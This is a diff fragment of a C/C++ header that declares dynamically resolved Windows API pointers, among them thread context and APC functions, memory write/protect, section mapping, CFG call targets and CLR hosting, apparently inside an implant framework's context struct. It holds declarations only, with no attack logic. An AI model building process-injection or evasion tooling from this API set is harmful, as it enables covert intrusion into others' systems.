+		NtGetContextThread_t NtGetContextThread;
+		NtSetContextThread_t NtSetContextThread;
+		NtSetInformationThread_t NtSetInformationThread;
+		NtQueueApcThread_t NtQueueApcThread;
+		NtAlertResumeThread_t NtAlertResumeThread;
+		NtWaitForSingleObject_t NtWaitForSingleObject;
+		NtSignalAndWaitForSingleObject_t NtSignalAndWaitForSingleObject;
+		NtContinue_t NtContinue;
+		NtTestAlert_t NtTestAlert;
+		NtDelayExecution_t NtDelayExecution;
+		NtCreateEvent_t NtCreateEvent;
+
+		// Threadpool
+		TpAllocWork_t TpAllocWork;
+		TpPostWork_t TpPostWork;
+		TpReleaseWork_t TpReleaseWork;
+
+		// Memory / Virtual Memory
+		NtFreeVirtualMemory_t NtFreeVirtualMemory;
+		NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
+		NtProtectVirtualMemory_t NtProtectVirtualMemory;
+		NtReadVirtualMemory_t NtReadVirtualMemory;
+		NtWriteVirtualMemory_t NtWriteVirtualMemory;
+		NtQueryVirtualMemory_t NtQueryVirtualMemory;
+		NtCreateSection_t NtCreateSection;
+		NtMapViewOfSection_t NtMapViewOfSection;
+		NtUnmapViewOfSection_t NtUnmapViewOfSection;
+		DTYPE(FlushInstructionCache);
+		SetProcessValidCallTargets_t SetProcessValidCallTargets;
+
+		// Heap Management
+		RtlCreateHeap_t RtlCreateHeap;
+		RtlAllocateHeap_t RtlAllocateHeap;
+		RtlReAllocateHeap_t RtlReAllocateHeap;
+		RtlFreeHeap_t RtlFreeHeap;
+		RtlDestroyHeap_t RtlDestroyHeap;
+		RtlRbInsertNodeEx_t RtlRbInsertNodeEx;
+
+		// Exception Handling
+		RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
+		RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
+
+		// Module / Library
+		DTYPE(GetProcAddress);
+		DTYPE(GetModuleHandleA);
+		DTYPE(LoadLibraryA);
+		DTYPE(FreeLibrary);
+
+		// Registry
+		DTYPE(RegOpenKeyExA);
+		DTYPE(RegCreateKeyExA);
+		DTYPE(RegSetValueExA);
+		DTYPE(RegCloseKey);
+
+		// System Info
+		DTYPE(GetUserNameA);
+		DTYPE(GetComputerNameExA);
+		DTYPE(GlobalMemoryStatusEx);
+		RtlGetVersion_t RtlGetVersion;
+		NtQuerySystemInformation_t NtQuerySystemInformation;
+		NtQuerySystemTime_t NtQuerySystemTime;
+
+		// Toolhelp Snapshots
+		DTYPE(CreateToolhelp32Snapshot);
+		DTYPE(Process32First);
+		DTYPE(Process32Next);
+		DTYPE(Module32First);
+		DTYPE(Module32Next);
+
+		// CLR Hosting
+		CLRCreateInstance_t CLRCreateInstance;
+
+		// Crypto
+		DTYPE(CryptStringToBinaryA);
+		DTYPE(CryptBinaryToStringA);
+
+		// Resources
+		DTYPE(FindResourceA);
+		DTYPE(LoadResource);
+		DTYPE(LockResource);
+		DTYPE(SizeofResource);
+		DTYPE(FreeResource);
+
+		// Random, Unicode, Misc
+		RtlInitUnicodeString_t RtlInitUnicodeString;
+		RtlHashUnicodeString_t RtlHashUnicodeString;
+		RtlRandomEx_t RtlRandomEx;
+		DTYPE(SleepEx);
+
+		// Native API Finalizer
+		NtClose_t NtClose;
+	} Win32;
 };
+
+DATA_SXN HEXANE *Ctx = nullptr;
 #endif
